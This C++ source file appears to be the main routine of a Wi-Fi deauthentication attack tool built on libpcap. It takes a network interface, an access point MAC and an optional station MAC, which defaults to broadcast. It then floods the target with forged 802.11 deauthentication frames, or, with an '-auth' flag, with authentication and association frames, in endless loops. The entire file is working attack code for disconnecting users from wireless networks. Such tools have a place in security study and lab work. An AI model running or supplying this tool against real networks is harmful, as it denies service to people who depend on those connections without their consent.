#include "main.h"

int main(int argc, char *argv[])
{
	if((argc != 3) && (argc != 4) && (argc != 5))
    {
        usage();
        return -1;
    }

    char *dev = argv[1];
    ap_mac = Mac(argv[2]);
    station_mac = Mac::broadcastMac();
    if (argc >= 4)
        station_mac = Mac((argv[3]));
    if (argc == 5 && !strcmp(argv[4], "-auth"))
		flag = true;


    char errbuf[PCAP_ERRBUF_SIZE];
    pcap_t *handle = pcap_open_live(dev, BUFSIZ, 1, 1000, errbuf);
    if (handle == nullptr)
    {
        fprintf(stderr, "couldn't open device %s(%s)\n", dev, errbuf);
        return -1;
    }

    if (flag == false)
    {
        while (true)
        {
            DeauthPacket deauthPacket = makeDeauthPacket(ap_mac, station_mac);
            int res = pcap_sendpacket(handle, reinterpret_cast<const u_char *>(&deauthPacket), sizeof(DeauthPacket));
            if (res != 0){
                fprintf(stderr, "deauthPacket return %d error=%s\n", res, pcap_geterr(handle));
            }
            printf("deauthPacket\n");
            sleep(0.5);
        }
    }
    else 
    {
        while(true)
        {
            AuthPacket authpacket = makeAuthPacket(ap_mac, station_mac);
            int res = pcap_sendpacket(handle, reinterpret_cast<const u_char *>(&authpacket), sizeof(authpacket));
            if (res != 0){
                fprintf(stderr, "authpacket return %d error=%s\n", res, pcap_geterr(handle));
            }
            sleep(0.5);
            AssociationPacket   associationpacket = makeAssociationPacket(ap_mac, station_mac);
            res = pcap_sendpacket(handle, reinterpret_cast<const u_char *>(&associationpacket), sizeof(associationpacket));
            if (res != 0){
                fprintf(stderr, "associationpacket return %d error=%s\n", res, pcap_geterr(handle));
            }
            printf("authpacket\n");
            sleep(0.5);
        }
    }

	pcap_close(handle);
}

